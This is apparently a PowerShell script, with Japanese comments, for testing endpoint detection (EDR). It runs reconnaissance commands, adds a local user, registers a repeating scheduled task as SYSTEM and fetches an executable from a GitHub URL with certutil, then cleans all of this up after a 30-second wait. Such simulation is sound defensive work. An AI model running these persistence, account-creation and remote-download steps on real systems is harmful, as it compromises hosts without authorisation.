# EDR Test Script 3+4: System Modification and Cleanup
cmd /c mkdir c:\edrtest 2>$null

ipconfig /all | Out-Null
arp -a | Out-Null
ping misdepatrment.com -n 1 | Out-Null
wmic useraccount get /ALL | Out-Null
net user sh123 /add 2>$null

# スケジュールタスク作成
$action = New-ScheduledTaskAction -Execute "ipconfig"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

try {
    Register-ScheduledTask -TaskName "edrtest" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
} catch {}

# ファイルダウンロード（calc.exeのみ）
certutil -urlcache -split -f "https://github.com/choro511/detection-testing/raw/refs/heads/main/calc.exe" "c:\edrtest\calc.exe" | Out-Null

# 30秒スリープ（EDR検知のための待機時間）
Start-Sleep -Seconds 30

# クリーンアップ開始
if (Test-Path "c:\edrtest") {
    Remove-Item -Path "c:\edrtest" -Recurse -Force -ErrorAction SilentlyContinue
}

try {
    Unregister-ScheduledTask -TaskName "edrtest" -Confirm:$false -ErrorAction SilentlyContinue
} catch {}

net user sh123 /delete 2>$null
